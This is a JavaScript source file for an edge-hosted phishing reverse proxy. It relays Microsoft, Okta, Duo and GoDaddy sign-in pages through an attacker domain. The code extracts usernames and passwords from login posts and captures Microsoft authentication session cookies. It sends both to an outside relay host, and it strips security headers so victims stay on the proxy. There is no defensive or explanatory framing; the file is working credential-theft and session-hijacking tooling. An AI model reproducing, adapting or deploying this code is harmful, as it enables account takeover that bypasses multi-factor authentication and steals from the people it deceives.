export const runtime = 'edge';

const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
};

function isOurDomain(domain) {
  if (!domain) return false;
  return domain === YOUR_DOMAIN || domain.endsWith('.' + YOUR_DOMAIN);
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  return Object.keys(IDENTITY_PROVIDERS).some(d => hostname.includes(d.replace(/^[^.]*\./, '')) || hostname === d);
}

// Parse URL and extract upstream
function parseUrl(pathname, search) {
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  const parts = path.split('/');
  const segments = [];
  
  for (let i = 0; i < parts.length; i++) {
    if (parts[i] === '_p' && i + 1 < parts.length) {
      segments.push({ domain: parts[i + 1], path: '/' + parts.slice(i + 2).join('/') });
      i++;
    }
  }
  
  let upstream = segments.find(s => !isOurDomain(s.domain));
  
  if (!upstream) {
    const embedded = path.match(/https?:\/?\/?([^\/]+)(.*)/);
    if (embedded) {
      upstream = { domain: embedded[1], path: embedded[2] || '/' };
    }
  }
  
  if (!upstream) {
    upstream = { domain: INITIAL_UPSTREAM, path: pathname };
  }
  
  return {
    upstream: upstream.domain,
    path: upstream.path,
    search: search || '',
    type: IDENTITY_PROVIDERS[upstream.domain]?.type || 'unknown'
  };
}

// Rewrite cookies preserving all attributes
function rewriteSetCookie(cookieStr, upstreamDomain, ourDomain) {
  // Replace Domain=upstream.com or Domain=.upstream.com
  return cookieStr
    .replace(/Domain=[.]?([^;]*)/gi, (match, domain) => {
      if (domain.includes(upstreamDomain)) {
        return `Domain=${ourDomain}`;
      }
      return match;
    })
    .replace(new RegExp(upstreamDomain, 'g'), ourDomain);
}

function hasCompleteAuth(cookieStr) {
  if (!cookieStr) return false;
  const upper = cookieStr.toUpperCase();
  return upper.includes('ESTSAUTH') && upper.includes('ESTSAUTHPERSISTENT');
}

async function sendToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

// Extract credentials from form post
function extractCreds(body) {
  if (!body) return {};
  try {
    const params = new URLSearchParams(body);
    const user = params.get('login') || params.get('loginfmt') || params.get('email') || params.get('username');
    const pass = params.get('passwd') || params.get('password');
    if (user && pass) return { user, pass };
    
    // Try JSON
    const json = JSON.parse(body);
    return { 
      user: json.login || json.username || json.email, 
      pass: json.passwd || json.password 
    };
  } catch (e) {
    return {};
  }
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
  
  if (BLOCKED_IPS.includes(ip)) return new Response('Access denied.', { status: 403 });
  
  const info = parseUrl(url.pathname, url.search);
  const upstreamUrl = `https://${info.upstream}${info.path}${info.search}`;
  
  console.log(`[${request.method}] ${url.pathname} -> ${upstreamUrl}`);
  
  // Clone headers
  const headers = new Headers(request.headers);
  
  // CRITICAL: Set Host header to upstream
  headers.set('Host', info.upstream);
  
  // Ensure proper forwarding
  if (!headers.has('Accept')) headers.set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
  if (!headers.has('Accept-Language')) headers.set('Accept-Language', 'en-US,en;q=0.9');
  
  // Remove problematic headers
  ['connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'expect'].forEach(h => headers.delete(h));
  
  let body = null;
  
  // Handle POST body and credential extraction
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      const text = await cloned.text();
      const creds = extractCreds(text);
      
      if (creds.user && creds.pass) {
        console.log(`[CREDS] ${creds.user.substring(0,5)}...`);
        await sendToVercel({ type: 'creds', ip, user: creds.user, pass: creds.pass, platform: info.type });
        
        const form = new FormData();
        form.append('file', new Blob([`IP: ${ip}\nUser: ${creds.user}\nPass: ${creds.pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDS.txt`);
        form.append('ip', ip);
        await fetch(VERCEL_URL, { method: 'POST', body: form });
      }
      
      // Re-create body stream for fetch
      body = text;
      headers.set('Content-Length', String(new TextEncoder().encode(text).length));
    } catch (e) {
      body = request.body;
    }
  }
  
  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body,
      redirect: 'manual' // Handle redirects manually
    });
    
    console.log(`[RESPONSE] ${resp.status} from ${info.upstream}`);
    
    // Build response headers from scratch
    const responseHeaders = new Headers();
    
    // Copy headers except Set-Cookie
    resp.headers.forEach((val, key) => {
      if (key.toLowerCase() !== 'set-cookie') {
        responseHeaders.set(key, val);
      }
    });
    
    // CORS headers
    responseHeaders.set('access-control-allow-origin', '*');
    responseHeaders.set('access-control-allow-credentials', 'true');
    responseHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    responseHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    
    // Remove security policies that interfere
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    responseHeaders.delete('x-frame-options'); // Allow framing if needed
    
    // Handle redirects (301, 302, 303, 307, 308)
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      let location = resp.headers.get('Location') || resp.headers.get('location');
      
      if (location) {
        // Rewrite location
        try {
          const locUrl = new URL(location);
          if (shouldProxyDomain(locUrl.hostname) && !isOurDomain(locUrl.hostname)) {
            location = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${locUrl.hostname}${locUrl.pathname}${locUrl.search}`;
          } else if (isOurDomain(locUrl.hostname)) {
            // Already our domain, keep as is
          } else if (location.startsWith('/')) {
            location = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${info.upstream}${location}`;
          }
        } catch (e) {
          // Relative URL
          location = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${info.upstream}${location}`;
        }
        
        console.log(`[REDIRECT] ${resp.status} to ${location}`);
        responseHeaders.set('Location', location);
        
        // Handle cookies on redirect response
        const cookies = resp.headers.getSetCookie?.() || [];
        let cookieStr = '';
        
        cookies.forEach(cookie => {
          cookieStr += cookie + '; ';
          const rewritten = rewriteSetCookie(cookie, info.upstream, url.hostname);
          responseHeaders.append('Set-Cookie', rewritten);
        });
        
        if (hasCompleteAuth(cookieStr)) {
          await sendToVercel({ type: 'cookies', ip, cookies: cookieStr, platform: info.type });
          
          const form = new FormData();
          form.append('file', new Blob([`IP: ${ip}\nPlatform: ${info.type}\nURL: ${url.href}\n\n${cookieStr}`], {type: 'text/plain'}), `${ip}-COOKIES.txt`);
          form.append('ip', ip);
          form.append('type', 'cookies');
          await fetch(VERCEL_URL, { method: 'POST', body: form });
        }
        
        // For 307/308, preserve method; for others, browser will handle appropriately
        return new Response(null, { status: resp.status, headers: responseHeaders });
      }
    }
    
    // Process cookies for normal responses
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = '';
    
    if (cookies.length > 0) {
      console.log(`[COOKIES] ${cookies.length} received: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
      
      cookies.forEach(cookie => {
        cookieStr += cookie + '; ';
        const rewritten = rewriteSetCookie(cookie, info.upstream, url.hostname);
        responseHeaders.append('Set-Cookie', rewritten);
      });
      
      if (hasCompleteAuth(cookieStr)) {
        console.log(`[EXFIL] Complete auth session`);
        await sendToVercel({ type: 'cookies', ip, cookies: cookieStr, platform: info.type });
        
        const form = new FormData();
        form.append('file', new Blob([`IP: ${ip}\nPlatform: ${info.type}\nURL: ${url.href}\n\n${cookieStr}`], {type: 'text/plain'}), `${ip}-COOKIES.txt`);
        form.append('ip', ip);
        form.append('type', 'cookies');
        await fetch(VERCEL_URL, { method: 'POST', body: form });
      }
    }
    
    // Process body content
    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      // Replace domains
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
      });
      
      // Adjust Content-Length if we modified body
      responseHeaders.set('Content-Length', String(new TextEncoder().encode(text).length));
      
      return new Response(text, { status: resp.status, headers: responseHeaders });
    }
    
    return new Response(resp.body, { status: resp.status, headers: responseHeaders });
    
  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), { 
      status: 502, 
      headers: { 'content-type': 'application/json' } 
    });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
